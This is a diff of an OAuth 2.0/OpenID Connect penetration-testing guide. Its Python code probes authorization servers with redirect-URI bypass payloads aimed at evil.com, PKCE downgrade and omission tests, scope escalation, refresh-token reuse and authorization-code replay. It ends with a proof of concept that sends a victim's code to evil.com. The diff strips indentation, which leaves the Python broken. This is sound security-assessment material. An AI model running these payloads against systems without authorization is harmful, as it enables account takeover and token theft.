@@ -1,10 +1,10 @@
 ---
 name: testing-oauth2-implementation-flaws
 description: Tests OAuth 2.0 and OpenID Connect implementations for authorization code
-  interception, redirect URI manipulation, CSRF in OAuth flows, token leakage, scope
-  escalation, and PKCE bypass, using Burp Suite Professional and the EsPReSSO extension
-  to probe the authorization server, client, and token handling. Use when assessing OAuth2/OIDC
-  flows or SSO systems for misconfigurations enabling account takeover.
+ interception, redirect URI manipulation, CSRF in OAuth flows, token leakage, scope
+ escalation, and PKCE bypass, using Burp Suite Professional and the EsPReSSO extension
+ to probe the authorization server, client, and token handling. Use when assessing OAuth2/OIDC
+ flows or SSO systems for misconfigurations enabling account takeover.
 domain: cybersecurity
 subdomain: api-security
 tags:
@@ -70,25 +70,25 @@ SCOPE = "openid profile email"
 # Discover OAuth endpoints
 well_known = requests.get(f"{AUTH_SERVER}/.well-known/openid-configuration")
 if well_known.status_code == 200:
-    config = well_known.json()
-    print("OAuth/OIDC Configuration:")
-    print(f"  Authorization: {config.get('authorization_endpoint')}")
-    print(f"  Token: {config.get('token_endpoint')}")
-    print(f"  UserInfo: {config.get('userinfo_endpoint')}")
-    print(f"  JWKS: {config.get('jwks_uri')}")
-    print(f"  Supported grants: {config.get('grant_types_supported')}")
-    print(f"  Supported scopes: {config.get('scopes_supported')}")
-    print(f"  PKCE methods: {config.get('code_challenge_methods_supported')}")
-    auth_endpoint = config['authorization_endpoint']
-    token_endpoint = config['token_endpoint']
+ config = well_known.json()
+ print("OAuth/OIDC Configuration:")
+ print(f" Authorization: {config.get('authorization_endpoint')}")
+ print(f" Token: {config.get('token_endpoint')}")
+ print(f" UserInfo: {config.get('userinfo_endpoint')}")
+ print(f" JWKS: {config.get('jwks_uri')}")
+ print(f" Supported grants: {config.get('grant_types_supported')}")
+ print(f" Supported scopes: {config.get('scopes_supported')}")
+ print(f" PKCE methods: {config.get('code_challenge_methods_supported')}")
+ auth_endpoint = config['authorization_endpoint']
+ token_endpoint = config['token_endpoint']
 else:
-    # Try common paths
-    for path in ["/authorize", "/oauth/authorize", "/oauth2/authorize", "/auth"]:
-        resp = requests.get(f"{AUTH_SERVER}{path}", allow_redirects=False)
-        if resp.status_code in (302, 400):
-            print(f"Authorization endpoint found: {AUTH_SERVER}{path}")
-            auth_endpoint = f"{AUTH_SERVER}{path}"
-            break
+ # Try common paths
+ for path in ["/authorize", "/oauth/authorize", "/oauth2/authorize", "/auth"]:
+ resp = requests.get(f"{AUTH_SERVER}{path}", allow_redirects=False)
+ if resp.status_code in (302, 400):
+ print(f"Authorization endpoint found: {AUTH_SERVER}{path}")
+ auth_endpoint = f"{AUTH_SERVER}{path}"
+ break
 ```
 
 ### Step 2: Redirect URI Validation Testing
@@ -96,54 +96,54 @@ else:
 ```python
 # Test redirect_uri validation strictness
 REDIRECT_BYPASS_PAYLOADS = [
-    # Open redirect variations
-    REDIRECT_URI,                                          # Legitimate
-    "https://evil.com",                                    # Different domain
-    "https://app.example.com.evil.com/callback",          # Subdomain of attacker
-    "https://app.example.com@evil.com/callback",          # URL authority confusion
-    f"{REDIRECT_URI}/../../../evil.com",                  # Path traversal
-    f"{REDIRECT_URI}?next=https://evil.com",              # Parameter injection
-    f"{REDIRECT_URI}#https://evil.com",                   # Fragment injection
-    f"{REDIRECT_URI}%23evil.com",                         # Encoded fragment
-    "https://app.example.com/callback/../../evil",        # Relative path
-    "https://APP.EXAMPLE.COM/callback",                   # Case variation
-    "https://app.example.com/Callback",                   # Path case variation
-    "https://app.example.com/callback/",                  # Trailing slash
-    "https://app.example.com/callback?",                  # Trailing question mark
-    "http://app.example.com/callback",                    # HTTP downgrade
-    "https://app.example.com:443/callback",               # Explicit port
-    "https://app.example.com:8443/callback",              # Different port
-    f"{REDIRECT_URI}/.evil.com",                          # Dot segment
-    "https://app.example.com/callbackevil",               # Path prefix match
-    "javascript://app.example.com/callback%0aalert(1)",   # JavaScript protocol
+ # Open redirect variations
+ REDIRECT_URI, # Legitimate
+ "https://evil.com", # Different domain
+ "https://app.example.com.evil.com/callback", # Subdomain of attacker
+ "https://app.example.com@evil.com/callback", # URL authority confusion
+ f"{REDIRECT_URI}/../../../evil.com", # Path traversal
+ f"{REDIRECT_URI}?next=https://evil.com", # Parameter injection
+ f"{REDIRECT_URI}#https://evil.com", # Fragment injection
+ f"{REDIRECT_URI}%23evil.com", # Encoded fragment
+ "https://app.example.com/callback/../../evil", # Relative path
+ "https://APP.EXAMPLE.COM/callback", # Case variation
+ "https://app.example.com/Callback", # Path case variation
+ "https://app.example.com/callback/", # Trailing slash
+ "https://app.example.com/callback?", # Trailing question mark
+ "http://app.example.com/callback", # HTTP downgrade
+ "https://app.example.com:443/callback", # Explicit port
+ "https://app.example.com:8443/callback", # Different port
+ f"{REDIRECT_URI}/.evil.com", # Dot segment
+ "https://app.example.com/callbackevil", # Path prefix match
+ "javascript://app.example.com/callback%0aalert(1)", # JavaScript protocol
 ]
 
 print("=== Redirect URI Validation Testing ===\n")
 for redirect in REDIRECT_BYPASS_PAYLOADS:
-    params = {
-        "response_type": "code",
-        "client_id": CLIENT_ID,
-        "redirect_uri": redirect,
-        "scope": SCOPE,
-        "state": secrets.token_urlsafe(32),
-    }
-    resp = requests.get(auth_endpoint, params=params, allow_redirects=False)
+ params = {
+ "response_type": "code",
+ "client_id": CLIENT_ID,
+ "redirect_uri": redirect,
+ "scope": SCOPE,
+ "state": secrets.token_urlsafe(32),
+ }
+ resp = requests.get(auth_endpoint, params=params, allow_redirects=False)
 
-    if resp.status_code == 302:
-        location = resp.headers.get("Location", "")
-        if "code=" in location or redirect in location:
-            status = "ACCEPTED"
-            if redirect != REDIRECT_URI:
-                print(f"  [VULNERABLE] {redirect[:70]} -> Redirect accepted")
-        else:
-            status = "REDIRECTED"
-    elif resp.status_code == 400:
-        status = "REJECTED"
-    else:
-        status = f"HTTP {resp.status_code}"
+ if resp.status_code == 302:
+ location = resp.headers.get("Location", "")
+ if "code=" in location or redirect in location:
+ status = "ACCEPTED"
+ if redirect != REDIRECT_URI:
+ print(f" [VULNERABLE] {redirect[:70]} -> Redirect accepted")
+ else:
+ status = "REDIRECTED"
+ elif resp.status_code == 400:
+ status = "REJECTED"
+ else:
+ status = f"HTTP {resp.status_code}"
 
-    if redirect == REDIRECT_URI:
-        print(f"  [BASELINE] {redirect[:70]} -> {status}")
+ if redirect == REDIRECT_URI:
+ print(f" [BASELINE] {redirect[:70]} -> {status}")
 ```
 
 ### Step 3: State Parameter (CSRF) Testing
@@ -151,27 +151,27 @@ for redirect in REDIRECT_BYPASS_PAYLOADS:
 ```python
 # Test 1: Missing state parameter
 params_no_state = {
-    "response_type": "code",
-    "client_id": CLIENT_ID,
-    "redirect_uri": REDIRECT_URI,
-    "scope": SCOPE,
+ "response_type": "code",
+ "client_id": CLIENT_ID,
+ "redirect_uri": REDIRECT_URI,
+ "scope": SCOPE,
 }
 resp = requests.get(auth_endpoint, params=params_no_state, allow_redirects=False)
 if resp.status_code == 302 and "code=" in resp.headers.get("Location", ""):
-    print("[CSRF] Authorization code issued without state parameter")
+ print("[CSRF] Authorization code issued without state parameter")
 
 # Test 2: State parameter reuse
 state_value = "fixed_state_value_123"
 # Use same state for multiple authorization requests
 for i in range(3):
-    params = {**params_no_state, "state": state_value}
-    resp = requests.get(auth_endpoint, params=params, allow_redirects=False)
-    if resp.status_code == 302:
-        location = resp.headers.get("Location", "")
-        returned_state = urllib.parse.parse_qs(
-            urllib.parse.urlparse(location).query).get("state", [None])[0]
-        if returned_state == state_value:
-            print(f"[INFO] Same state accepted on attempt {i+1} (check client-side validation)")
+ params = {**params_no_state, "state": state_value}
+ resp = requests.get(auth_endpoint, params=params, allow_redirects=False)
+ if resp.status_code == 302:
+ location = resp.headers.get("Location", "")
+ returned_state = urllib.parse.parse_qs(
+ urllib.parse.urlparse(location).query).get("state", [None])[0]
+ if returned_state == state_value:
+ print(f"[INFO] Same state accepted on attempt {i+1} (check client-side validation)")
 
 # Test 3: Token exchange without state validation (client-side check)
 # Intercept the callback and try exchanging the code without state
@@ -186,53 +186,53 @@ print("\nNote: State validation is a client-side check. Verify the callback hand
 # Generate PKCE values
 code_verifier = secrets.token_urlsafe(64)[:128]
 code_challenge = base64.urlsafe_b64encode(
-    hashlib.sha256(code_verifier.encode()).digest()
+ hashlib.sha256(code_verifier.encode()).digest()
 ).decode().rstrip('=')
 
 # Test 1: Authorization request without PKCE
 params_no_pkce = {
-    "response_type": "code",
-    "client_id": CLIENT_ID,
-    "redirect_uri": REDIRECT_URI,
-    "scope": SCOPE,
-    "state": secrets.token_urlsafe(32),
+ "response_type": "code",
+ "client_id": CLIENT_ID,
+ "redirect_uri": REDIRECT_URI,
+ "scope": SCOPE,
+ "state": secrets.token_urlsafe(32),
 }
 resp = requests.get(auth_endpoint, params=params_no_pkce, allow_redirects=False)
 if resp.status_code == 302 and "code=" in resp.headers.get("Location", ""):
-    print("[PKCE] Authorization code issued without PKCE challenge")
+ print("[PKCE] Authorization code issued without PKCE challenge")
 
 # Test 2: Token exchange without code_verifier
-auth_code = "captured_auth_code"  # From intercept
+auth_code = "captured_auth_code" # From intercept
 token_resp = requests.post(token_endpoint, data={
-    "grant_type": "authorization_code",
-    "code": auth_code,
-    "redirect_uri": REDIRECT_URI,
-    "client_id": CLIENT_ID,
-    # No code_verifier
+ "grant_type": "authorization_code",
+ "code": auth_code,
+ "redirect_uri": REDIRECT_URI,
+ "client_id": CLIENT_ID,
+ # No code_verifier
 })
 if token_resp.status_code == 200:
-    print("[PKCE] Token issued without code_verifier - PKCE not enforced")
+ print("[PKCE] Token issued without code_verifier - PKCE not enforced")
 
 # Test 3: Token exchange with wrong code_verifier
 token_resp = requests.post(token_endpoint, data={
-    "grant_type": "authorization_code",
-    "code": auth_code,
-    "redirect_uri": REDIRECT_URI,
-    "client_id": CLIENT_ID,
-    "code_verifier": "wrong_verifier_value_that_does_not_match",
+ "grant_type": "authorization_code",
+ "code": auth_code,
+ "redirect_uri": REDIRECT_URI,
+ "client_id": CLIENT_ID,
+ "code_verifier": "wrong_verifier_value_that_does_not_match",
 })
 if token_resp.status_code == 200:
-    print("[PKCE] Token issued with wrong code_verifier - PKCE validation broken")
+ print("[PKCE] Token issued with wrong code_verifier - PKCE validation broken")
 
 # Test 4: Downgrade from S256 to plain
 params_plain_pkce = {
-    **params_no_pkce,
-    "code_challenge": code_verifier,  # Plain = verifier itself
-    "code_challenge_method": "plain",
+ **params_no_pkce,
+ "code_challenge": code_verifier, # Plain = verifier itself
+ "code_challenge_method": "plain",
 }
 resp = requests.get(auth_endpoint, params=params_plain_pkce, allow_redirects=False)
 if resp.status_code == 302:
-    print("[PKCE] Plain challenge method accepted - vulnerable to interception")
+ print("[PKCE] Plain challenge method accepted - vulnerable to interception")
 ```
 
 ### Step 5: Scope Escalation and Token Testing
@@ -240,45 +240,45 @@ if resp.status_code == 302:
 ```python
 # Test 1: Request additional scopes beyond what's registered
 elevated_scopes = [
-    "openid profile email admin",
-    "openid profile email write:users",
-    "openid profile email delete:*",
-    "openid profile email admin:full",
-    "*",
+ "openid profile email admin",
+ "openid profile email write:users",
+ "openid profile email delete:*",
+ "openid profile email admin:full",
+ "*",
 ]
 
 for scope in elevated_scopes:
-    params = {
-        "response_type": "code",
-        "client_id": CLIENT_ID,
-        "redirect_uri": REDIRECT_URI,
-        "scope": scope,
-        "state": secrets.token_urlsafe(32),
-    }
-    resp = requests.get(auth_endpoint, params=params, allow_redirects=False)
-    if resp.status_code == 302:
-        location = resp.headers.get("Location", "")
-        if "code=" in location:
-            print(f"[SCOPE] Elevated scope accepted: {scope}")
+ params = {
+ "response_type": "code",
+ "client_id": CLIENT_ID,
+ "redirect_uri": REDIRECT_URI,
+ "scope": scope,
+ "state": secrets.token_urlsafe(32),
+ }
+ resp = requests.get(auth_endpoint, params=params, allow_redirects=False)
+ if resp.status_code == 302:
+ location = resp.headers.get("Location", "")
+ if "code=" in location:
+ print(f"[SCOPE] Elevated scope accepted: {scope}")
 
 # Test 2: Token reuse across clients
 # Use a token from client A on client B's API
 token_a = "access_token_from_client_a"
 resp = requests.get("https://other-service.example.com/api/resource",
-    headers={"Authorization": f"Bearer {token_a}"})
+ headers={"Authorization": f"Bearer {token_a}"})
 if resp.status_code == 200:
-    print("[TOKEN] Token from client A accepted by different service (audience not validated)")
+ print("[TOKEN] Token from client A accepted by different service (audience not validated)")
 
 # Test 3: Refresh token theft and reuse
 refresh_token = "captured_refresh_token"
 # Try using refresh token with different client_id
 token_resp = requests.post(token_endpoint, data={
-    "grant_type": "refresh_token",
-    "refresh_token": refresh_token,
-    "client_id": "different-client-id",
+ "grant_type": "refresh_token",
+ "refresh_token": refresh_token,
+ "client_id": "different-client-id",
 })
 if token_resp.status_code == 200:
-    print("[TOKEN] Refresh token accepted for different client - not bound to client")
+ print("[TOKEN] Refresh token accepted for different client - not bound to client")
 ```
 
 ### Step 6: Implicit Flow and Token Leakage Testing
@@ -286,39 +286,39 @@ if token_resp.status_code == 200:
 ```python
 # Test if implicit flow is enabled (should be disabled per OAuth 2.1)
 implicit_params = {
-    "response_type": "token",
-    "client_id": CLIENT_ID,
-    "redirect_uri": REDIRECT_URI,
-    "scope": SCOPE,
-    "state": secrets.token_urlsafe(32),
+ "response_type": "token",
+ "client_id": CLIENT_ID,
+ "redirect_uri": REDIRECT_URI,
+ "scope": SCOPE,
+ "state": secrets.token_urlsafe(32),
 }
 resp = requests.get(auth_endpoint, params=implicit_params, allow_redirects=False)
 if resp.status_code == 302:
-    location = resp.headers.get("Location", "")
-    if "access_token=" in location:
-        print("[IMPLICIT] Implicit flow enabled - token in URL fragment (deprecated/insecure)")
+ location = resp.headers.get("Location", "")
+ if "access_token=" in location:
+ print("[IMPLICIT] Implicit flow enabled - token in URL fragment (deprecated/insecure)")
 
 # Test token leakage via Referer header
 # Check if tokens appear in URLs that could leak via Referer
 print("\nToken Leakage Checks:")
-print("  - Check if access tokens appear in URL query parameters")
-print("  - Check if tokens are logged in server access logs")
-print("  - Check if callback URL with code is cached by the browser")
-print("  - Check if the authorization code is single-use (replay test)")
+print(" - Check if access tokens appear in URL query parameters")
+print(" - Check if tokens are logged in server access logs")
+print(" - Check if callback URL with code is cached by the browser")
+print(" - Check if the authorization code is single-use (replay test)")
 
 # Authorization code replay test
 auth_code_to_replay = "captured_auth_code"
 for attempt in range(3):
-    token_resp = requests.post(token_endpoint, data={
-        "grant_type": "authorization_code",
-        "code": auth_code_to_replay,
-        "redirect_uri": REDIRECT_URI,
-        "client_id": CLIENT_ID,
-        "client_secret": "client_secret_value",
-    })
-    print(f"  Code replay attempt {attempt+1}: {token_resp.status_code}")
-    if attempt > 0 and token_resp.status_code == 200:
-        print("  [VULNERABLE] Authorization code is not single-use")
+ token_resp = requests.post(token_endpoint, data={
+ "grant_type": "authorization_code",
+ "code": auth_code_to_replay,
+ "redirect_uri": REDIRECT_URI,
+ "client_id": CLIENT_ID,
+ "client_secret": "client_secret_value",
+ })
+ print(f" Code replay attempt {attempt+1}: {token_resp.status_code}")
+ if attempt > 0 and token_resp.status_code == 200:
+ print(" [VULNERABLE] Authorization code is not single-use")
 ```
 
 ## Key Concepts
@@ -382,9 +382,9 @@ state parameter is not validated by the client application.
 
 **Proof of Concept**:
 1. Craft authorization URL with manipulated redirect_uri:
-   https://auth.example.com/authorize?response_type=code&client_id=app
-   &redirect_uri=https://app.example.com/callback/../../../evil.com
-   &scope=openid+profile+email&state=abc123
+ https://auth.example.com/authorize?response_type=code&client_id=app
+ &redirect_uri=https://app.example.com/callback/../../../evil.com
+ &scope=openid+profile+email&state=abc123
 2. User authenticates and approves consent
 3. Authorization code redirected to https://evil.com?code=AUTH_CODE&state=abc123
 4. Attacker exchanges code at token endpoint (no PKCE required)
